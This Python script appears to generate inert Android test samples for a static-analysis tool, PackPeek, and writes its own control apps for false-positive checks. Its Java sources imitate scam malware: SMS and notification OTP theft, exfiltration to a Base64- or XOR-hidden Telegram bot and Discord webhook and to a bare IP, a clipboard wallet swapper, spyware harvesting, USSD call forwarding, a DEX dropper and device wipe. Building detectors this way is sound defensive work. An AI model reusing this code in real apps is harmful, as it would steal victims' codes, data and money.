#!/usr/bin/env python3
"""Generates harmless test-sample sources, one package per scam modus, for PackPeek's deep
analysis. Every sample is INERT: its manifest declares android:hasCode="false", so Android never
loads or runs the code even if the APK is installed; all endpoints and tokens are fake and marked
SIMULATION. The code exists only so PackPeek's static analysis has something to find.

Run: python3 generate.py   (writes samples/<name>/ ; then build-all.sh compiles each to an APK)
"""
import base64
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))

# A fake Telegram bot URL and Discord webhook, hidden the way scam apps hide them.
TELEGRAM = "https://api.telegram.org/bot123456789:SIMULATIONxONLYxNOTxAxREALxTOKENxxx/sendMessage?chat_id=0&text="
TELEGRAM_B64 = base64.b64encode(TELEGRAM.encode()).decode()
DISCORD = "https://discord.com/api/webhooks/000000000/SIMULATION-ONLY-NOT-REAL"
XOR_KEY = 0x2a
def _sbyte(v):
    v &= 0xFF
    return v - 256 if v >= 128 else v
DISCORD_XOR = ", ".join(str(_sbyte(b ^ XOR_KEY)) for b in DISCORD.encode())

HEADER = (
    "// TEST SAMPLE ONLY — never runs (manifest hasCode=\"false\"). Fake endpoints marked SIMULATION.\n"
    "// Exists so PackPeek's static analysis can recognise a scam pattern. It sends nothing.\n"
)

# Shared harmless "gadget" that imitates where stolen data is sent. Compiled with every sample.
COMMON_NET = HEADER + """package sim.common;

import android.util.Base64;
import java.net.HttpURLConnection;
import java.net.URL;

public final class Net {
    /** Bot URL hidden in Base64, like real OTP-stealer droppers. */
    public static void toTelegram(String data) {
        try {
            String url = new String(Base64.decode(\"%TELEGRAM_B64%\", Base64.DEFAULT));
            ((HttpURLConnection) new URL(url + data).openConnection()).getResponseCode();
        } catch (Exception ignored) {
        }
    }

    /** Webhook scrambled with a one-byte XOR. */
    public static void toWebhook(String data) {
        try {
            byte[] raw = {%DISCORD_XOR%};
            for (int i = 0; i < raw.length; i++) raw[i] ^= 0x2a;
            ((HttpURLConnection) new URL(new String(raw) + data).openConnection()).getOutputStream();
        } catch (Exception ignored) {
        }
    }

    /** A bare IP with no domain name, as command-and-control servers often use. */
    public static void toServer(String data) {
        try {
            ((HttpURLConnection) new URL(\"http://185.199.108.153/collect?d=\" + data).openConnection()).getOutputStream();
        } catch (Exception ignored) {
        }
    }
}
""".replace("%TELEGRAM_B64%", TELEGRAM_B64).replace("%DISCORD_XOR%", DISCORD_XOR)


def manifest(pkg, label, perms, inner, has_launcher=False):
    uses = "\n".join(
        f'    <uses-permission android:name="android.permission.{p}" />' for p in perms
    )
    launcher = (
        """
            <intent-filter><action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" /></intent-filter>"""
        if has_launcher
        else ""
    )
    return f"""<?xml version="1.0" encoding="utf-8"?>
<!-- TEST SAMPLE ONLY. Imitates a scam modus for PackPeek. android:hasCode="false": the declared
     components do not exist and nothing runs, even if installed. -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{pkg}" android:versionCode="1" android:versionName="1.0-sim">
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="30" />
{uses}
    <application android:label="@string/app_name" android:hasCode="false">
        <activity android:name=".Main" android:exported="true">{launcher}
        </activity>
{inner}
    </application>
</manifest>
"""


SAMPLES = {}


def sample(name, label, pkg, perms, files, manifest_inner="", res=None, payload=None, has_launcher=True):
    SAMPLES[name] = dict(
        label=label, pkg=pkg, perms=perms, files=files,
        manifest_inner=manifest_inner, res=res or {}, payload=payload, has_launcher=has_launcher,
    )


ACCESSIBILITY_XML = """<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:accessibilityFeedbackType="feedbackGeneric" />
"""

ACC_SERVICE = """        <service android:name=".Watcher" android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility" />
        </service>"""

# ---- 1. OTP theft via SMS, handed to a Service by Intent, sent to Telegram -------------------
sample(
    "otp-telegram", "Undangan Pernikahan", "sim.scam.otptelegram",
    ["INTERNET", "RECEIVE_SMS", "READ_SMS"],
    {
        "Main.java": HEADER + "package sim.scam.otptelegram; public class Main {}",
        "SmsHook.java": HEADER + """package sim.scam.otptelegram;
import android.content.*; import android.provider.Telephony; import android.telephony.SmsMessage;
public class SmsHook extends BroadcastReceiver {
    public void onReceive(Context c, Intent i) {
        SmsMessage[] m = Telephony.Sms.Intents.getMessagesFromIntent(i);
        Intent up = new Intent(c, Uploader.class);
        up.putExtra("t", m[0].getMessageBody() + " " + m[0].getOriginatingAddress());
        c.startService(up);
    }
}""",
        "Uploader.java": HEADER + """package sim.scam.otptelegram;
import android.app.Service; import android.content.Intent; import android.os.IBinder; import sim.common.Net;
public class Uploader extends Service {
    public int onStartCommand(Intent i, int f, int s) { Net.toTelegram(i.getStringExtra("t")); return 2; }
    public IBinder onBind(Intent i) { return null; }
}""",
    },
    manifest_inner="""        <receiver android:name=".SmsHook" android:exported="true" android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
        </receiver>
        <service android:name=".Uploader" android:exported="false" />""",
    has_launcher=False,  # hidden icon, like real invitation scams
)

# ---- 2. Notification-listener OTP stealer → Discord webhook -----------------------------------
sample(
    "notif-webhook", "Status Pengiriman", "sim.scam.notifhook",
    ["INTERNET"],
    {
        "Main.java": HEADER + "package sim.scam.notifhook; public class Main {}",
        "Listener.java": HEADER + """package sim.scam.notifhook;
import android.service.notification.*; import sim.common.Net;
public class Listener extends NotificationListenerService {
    public void onNotificationPosted(StatusBarNotification sbn) {
        CharSequence t = sbn.getNotification().extras.getCharSequence("android.text");
        Net.toWebhook(String.valueOf(t));
    }
}""",
    },
    manifest_inner="""        <service android:name=".Listener" android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
        </service>""",
)

# ---- 3. Banking overlay phishing + screen-reading accessibility ------------------------------
sample(
    "bank-overlay", "Pembaruan Sistem", "sim.scam.bankoverlay",
    ["INTERNET", "SYSTEM_ALERT_WINDOW"],
    {
        "Main.java": HEADER + "package sim.scam.bankoverlay; public class Main {}",
        "Watcher.java": HEADER + """package sim.scam.bankoverlay;
import android.accessibilityservice.AccessibilityService; import android.view.accessibility.*;
import android.view.WindowManager; import android.content.Context; import android.widget.FrameLayout; import sim.common.Net;
public class Watcher extends AccessibilityService {
    public void onAccessibilityEvent(AccessibilityEvent e) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            Net.toServer(String.valueOf(root.getText()));
            if (String.valueOf(e.getPackageName()).contains("bank")) showFake();
        }
    }
    void showFake() {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        wm.addView(new FrameLayout(this), new WindowManager.LayoutParams(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, 0, -3));
    }
    public void onInterrupt() {}
}""",
    },
    manifest_inner=ACC_SERVICE,
    res={"xml/accessibility.xml": ACCESSIBILITY_XML},
)

# ---- 4. Clipboard crypto-address swapper -----------------------------------------------------
sample(
    "clipboard-swap", "QR Pembayaran", "sim.scam.clipboard",
    ["INTERNET"],
    {
        "Main.java": HEADER + """package sim.scam.clipboard;
import android.content.*; import sim.common.Net;
public class Main {
    void watch(Context c) {
        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
        cm.addPrimaryClipChangedListener(() -> {
            CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();
            Net.toTelegram(String.valueOf(t));                       // leak what was copied
            cm.setPrimaryClip(ClipData.newPlainText("", "1ATTACKERWALLETxSIMULATION"));  // swap it
        });
    }
}""",
    },
)

# ---- 5. Full spyware: contacts, call log, location, mic → bare-IP server ----------------------
sample(
    "spyware-exfil", "Cleaner Pro", "sim.scam.spyware",
    ["INTERNET", "READ_CONTACTS", "READ_CALL_LOG", "ACCESS_FINE_LOCATION", "RECORD_AUDIO", "READ_PHONE_STATE"],
    {
        "Main.java": HEADER + """package sim.scam.spyware;
import android.content.Context; import android.database.Cursor; import android.provider.*;
import android.location.*; import android.media.MediaRecorder; import android.telephony.TelephonyManager; import sim.common.Net;
public class Main {
    void harvest(Context c) {
        Cursor a = c.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        Cursor b = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
        Location loc = lm.getLastKnownLocation("gps");
        TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
        String id = tm.getDeviceId() + tm.getLine1Number();
        MediaRecorder r = new MediaRecorder(); r.setAudioSource(MediaRecorder.AudioSource.MIC);
        Net.toServer(a.getCount() + "|" + b.getCount() + "|" + loc + "|" + id);
    }
}""",
    },
)

# ---- 6. Call-forwarding theft (USSD) + SMS --------------------------------------------------
sample(
    "call-forward", "Info BPJS", "sim.scam.callforward",
    ["INTERNET", "RECEIVE_SMS", "READ_SMS", "CALL_PHONE"],
    {
        "Main.java": HEADER + """package sim.scam.callforward;
import android.content.Context; import android.telephony.TelephonyManager; import android.os.Handler; import sim.common.Net;
public class Main {
    void forward(Context c) {
        TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
        tm.sendUssdRequest("**21*628123456789#", null, new Handler());   // forward calls to attacker
        Net.toTelegram("forwarded");
    }
    String code() { return "**21*628123456789#"; }
}""",
        "SmsHook.java": HEADER + """package sim.scam.callforward;
import android.content.*; import android.telephony.SmsMessage;
public class SmsHook extends BroadcastReceiver {
    public void onReceive(Context c, Intent i) {
        Object[] p = (Object[]) i.getExtras().get("pdus");
        SmsMessage m = SmsMessage.createFromPdu((byte[]) p[0]);
        new Main().forward(c);
    }
}""",
    },
    manifest_inner="""        <receiver android:name=".SmsHook" android:exported="true">
            <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
        </receiver>""",
    has_launcher=False,
)

# ---- 7. Dropper: hidden DEX payload, dynamic loading and shell -------------------------------
sample(
    "dropper", "Font Installer", "sim.scam.dropper",
    ["INTERNET"],
    {
        "Main.java": HEADER + """package sim.scam.dropper;
import android.content.Context; import dalvik.system.DexClassLoader; import java.io.File;
public class Main {
    void stage2(Context c) throws Exception {
        File dex = new File(c.getCacheDir(), "payload.bin");
        DexClassLoader loader = new DexClassLoader(dex.getPath(), c.getCacheDir().getPath(), null, c.getClassLoader());
        loader.loadClass("sim.payload.Stage2").getMethod("run", Context.class).invoke(null, c);
        Runtime.getRuntime().exec(new String[]{"sh", "-c", "chmod 777 " + dex.getPath()});
    }
}""",
    },
    payload={
        "Stage2.java": HEADER + """package sim.payload;
import android.content.Context; import android.database.Cursor; import android.provider.Telephony; import sim.common.Net;
public final class Stage2 {
    public static void run(Context c) {
        Cursor cur = c.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        Net.toTelegram("sms=" + (cur == null ? 0 : cur.getCount()));
    }
}""",
    },
)

# ---- 8. Device-admin lock/wipe + hidden icon (ransomware style) ------------------------------
sample(
    "device-admin", "Google Services", "sim.scam.deviceadmin",
    ["INTERNET"],
    {
        "Main.java": HEADER + """package sim.scam.deviceadmin;
import android.app.admin.DevicePolicyManager; import android.content.*; import android.content.pm.PackageManager;
public class Main {
    void lock(Context c) {
        DevicePolicyManager dpm = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
        dpm.lockNow();
        dpm.resetPassword("1234", 0);
        dpm.wipeData(0);
    }
    void hide(Context c) {
        c.getPackageManager().setComponentEnabledSetting(new ComponentName(c, Main.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}""",
        "Admin.java": HEADER + "package sim.scam.deviceadmin; import android.app.admin.DeviceAdminReceiver; public class Admin extends DeviceAdminReceiver {}",
    },
    manifest_inner="""        <receiver android:name=".Admin" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
            <meta-data android:name="android.app.device_admin" android:resource="@xml/admin" />
            <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
        </receiver>""",
    res={"xml/admin.xml": """<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android"><uses-policies>
    <force-lock /><wipe-data /><reset-password /></uses-policies></device-admin>
"""},
    has_launcher=False,
)

# ---- Control A: ad/analytics heavy, but no theft (must NOT be a strong indicator) ------------
sample(
    "control-adware", "Flashlight Free", "sim.app.flashlight",
    ["INTERNET", "ACCESS_NETWORK_STATE"],
    {
        "Main.java": HEADER + "package sim.app.flashlight; public class Main {}",
        # Classes under known ad SDK package prefixes, so PackPeek lists them as ad/analytics SDKs.
        "Ads.java": HEADER + """package com.google.android.gms.ads;
public class Ads { public void load() {} }""",
        "Fb.java": HEADER + """package com.facebook.ads;
public class Fb { public void init() {} }""",
    },
)

# ---- Control B: an ordinary app talking only to its own HTTPS server (must be clean) ---------
sample(
    "control-clean", "Catatan Harian", "sim.app.notes",
    ["INTERNET"],
    {
        "Main.java": HEADER + """package sim.app.notes;
import java.net.*;
public class Main {
    void sync(String note) throws Exception {
        ((HttpsURLConnection) new URL("https://notes.example.com/sync").openConnection()).getOutputStream().write(note.getBytes());
    }
}""".replace("HttpsURLConnection", "javax.net.ssl.HttpsURLConnection"),
    },
)


# ---- Control C: overloads. a(String) reads the clipboard, a(int) sends a counter. -----------
# They are different methods; no clipboard-to-internet path may be reported.
sample(
    "control-overload", "Penghitung", "sim.app.counter",
    ["INTERNET"],
    {
        "Main.java": HEADER + """package sim.app.counter;
import android.content.*; import java.net.*;
public class Main {
    Context c;
    String a(String label) {
        ClipboardManager cm = (ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
        return label + cm.getPrimaryClip();
    }
    void a(int count) throws Exception {
        ((java.net.HttpURLConnection) new URL("https://counter.example.com/hit").openConnection()).getOutputStream().write(count);
    }
}""",
    },
)

# ---- Control D: reads a cookie and sends a request in one method, but the request does not
# carry the cookie. Same code path, no traced value: must not be reported as a traced flow.
sample(
    "control-unlinked", "Info Cuaca", "sim.app.weather",
    ["INTERNET"],
    {
        "Main.java": HEADER + """package sim.app.weather;
import android.webkit.CookieManager; import java.net.*;
public class Main {
    boolean loggedIn;
    void refresh() throws Exception {
        loggedIn = CookieManager.getInstance().getCookie("https://weather.example.com") != null;
        ((java.net.HttpURLConnection) new URL("https://weather.example.com/today").openConnection()).getResponseCode();
    }
}""",
    },
)

def write():
    for name, s in SAMPLES.items():
        root = os.path.join(HERE, "samples", name)
        src = os.path.join(root, "src")
        for rel, content in s["files"].items():
            pkgdir = "/".join(_pkg_of(content).split("."))
            path = os.path.join(src, pkgdir, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            open(path, "w").write(content)
        # Shared Net gadget, only where the sample's own code references it (controls omit it).
        if any("sim.common.Net" in c for c in s["files"].values()):
            netpath = os.path.join(src, "sim", "common", "Net.java")
            os.makedirs(os.path.dirname(netpath), exist_ok=True)
            open(netpath, "w").write(COMMON_NET)
        if s["payload"]:
            pdir = os.path.join(root, "payload")
            for rel, content in s["payload"].items():
                path = os.path.join(pdir, "/".join(_pkg_of(content).split(".")), rel)
                os.makedirs(os.path.dirname(path), exist_ok=True)
                open(path, "w").write(content)
            if any("sim.common.Net" in c for c in s["payload"].values()):
                np = os.path.join(pdir, "sim", "common", "Net.java")
                os.makedirs(os.path.dirname(np), exist_ok=True)
                open(np, "w").write(COMMON_NET)
        resdir = os.path.join(root, "res")
        os.makedirs(os.path.join(resdir, "values"), exist_ok=True)
        open(os.path.join(resdir, "values", "strings.xml"), "w").write(
            f'<?xml version="1.0" encoding="utf-8"?>\n<resources><string name="app_name">{s["label"]}</string></resources>\n'
        )
        for rel, content in s["res"].items():
            path = os.path.join(resdir, rel)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            open(path, "w").write(content)
        open(os.path.join(root, "AndroidManifest.xml"), "w").write(
            manifest(s["pkg"], s["label"], s["perms"], s["manifest_inner"], s["has_launcher"])
        )
    print(f"Wrote {len(SAMPLES)} samples: {', '.join(SAMPLES)}")


def _pkg_of(java):
    for line in java.splitlines():
        line = line.strip()
        if line.startswith("package "):
            return line[len("package "):].split(";")[0].strip()
    return ""


if __name__ == "__main__":
    write()
